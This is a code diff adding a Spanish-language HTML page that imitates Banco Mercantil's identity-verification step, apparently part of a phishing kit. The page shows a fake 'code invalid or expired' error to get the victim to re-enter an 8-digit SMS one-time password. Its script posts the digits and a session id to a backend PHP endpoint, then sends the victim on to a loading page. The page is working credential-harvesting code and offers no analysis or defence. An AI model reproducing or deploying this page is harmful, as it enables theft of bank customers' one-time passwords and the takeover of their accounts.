@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<meta name="theme-color" content="#1976d2">
+<link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
+<title>Mercantil</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+  html,body{margin:0;padding:0;background:#f2f2f2}
+  .wrap{max-width:650px;margin:0 auto;width:90%}
+  .hdr-top{background:#004e9b;width:100%;display:flex;justify-content:center}
+  .hdr-top img{width:60%;max-width:240px;margin:auto;padding:8px 0;display:block}
+  .card{background:#fff;border-radius:12px;padding:22px;box-shadow:0 2px 6px rgba(0,0,0,.18);margin-top:22px}
+  #h3{color:#009fda;font-size:24px;font-weight:600;margin:14px 0 6px}
+  #h6{color:#004e9b;font-weight:600;font-size:20px;margin:8px 0}
+  .subt{font-size:13px;color:#556}
+  .err{background:#ffbcbc;border:1px solid #d33;color:#7a0000;border-radius:10px;padding:12px;margin:18px 0;line-height:1.4;font-size:13.5px}
+  .err b{display:block;margin-bottom:3px}
+  .lbl{display:block;color:#004e9b;font-weight:600;font-size:14px;margin:22px 0 10px}
+  .pins{display:flex;gap:.5rem;justify-content:center}
+  .pin{width:34px;height:44px;border:none;border-bottom:2px solid #447db6;text-align:center;font-size:1.5rem;background:transparent;outline:none}
+  .pin:focus{border-color:#008f76}
+  .pin.err{border-bottom-color:#d33}
+  .infoNum{font-size:13px;color:#556;margin:8px 0 4px}
+  .adis{text-align:center;line-height:1.5;margin:22px 0;font-size:13.5px;color:#445}
+  button.cont{width:100%;background:#004e9b;color:#fff;border:none;padding:12px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
+  button.cont:hover{background:#003b77}
+  footer{text-align:center;font-size:11px;color:#889;padding:26px 12px;line-height:1.5}
+</style>
+</head>
+<body>
+<header class="hdr-top"><img src="logotauro.svg" alt="Mercantil"></header>
+<div class="wrap">
+  <div id="h3">Verifiquemos tu identidad</div>
+  <div class="card">
+    <p id="h6">Ingresa la clave temporal</p>
+    <p class="subt"><b>Siguiente paso:</b> Finalizar</p>
+    <div class="err"><b>El código ingresado es inválido o ha expirado.</b>Por tu seguridad, solicita un nuevo código e inténtalo nuevamente.</div>
+    <p class="infoNum">Introduce nuevamente la clave temporal enviada a tu teléfono celular registrado.</p>
+    <form id="pinForm">
+      <label class="lbl">Clave Temporal</label>
+      <div class="pins">
+        <input class="pin" type="tel" maxlength="1" id="c1" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c2" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c3" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c4" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c5" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c6" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c7" inputmode="numeric">
+        <input class="pin" type="tel" maxlength="1" id="c8" inputmode="numeric">
+      </div>
+      <div class="adis">Revisa el mensaje de texto enviado a tu celular e ingresa la nueva clave.</div>
+      <button class="cont" type="submit">Continuar</button>
+    </form>
+  </div>
+  <footer>El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</footer>
+</div>
+<script>
+  const BACKEND='acciones.php';
+  const sid=new URLSearchParams(location.search).get('id')||sessionStorage.getItem('active_session_id')||'';
+  const pins=[...document.querySelectorAll('.pin')];
+  pins.forEach((p,i)=>{
+    p.addEventListener('input',()=>{p.value=p.value.replace(/\D/g,'');if(p.value&&i<pins.length-1)pins[i+1].focus();check();});
+    p.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!p.value&&i>0)pins[i-1].focus();});
+  });
+  pins[0].focus();
+  function check(){ if(pins.every(p=>p.value)) document.getElementById('pinForm').requestSubmit(); }
+  document.getElementById('pinForm').addEventListener('submit',async e=>{
+    e.preventDefault();
+    const cod=pins.map(p=>p.value).join('');
+    if(cod.length<8){return;}
+    await fetch(BACKEND+'?accion=sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:sid,code1:pins[0].value,code2:pins[1].value,code3:pins[2].value,code4:pins[3].value,code5:pins[4].value,code6:pins[5].value,code7:pins[6].value,code8:pins[7].value})});
+    window.location.href='loade830.html?id='+encodeURIComponent(sid);
+  });
+</script>
+</body>
+</html>
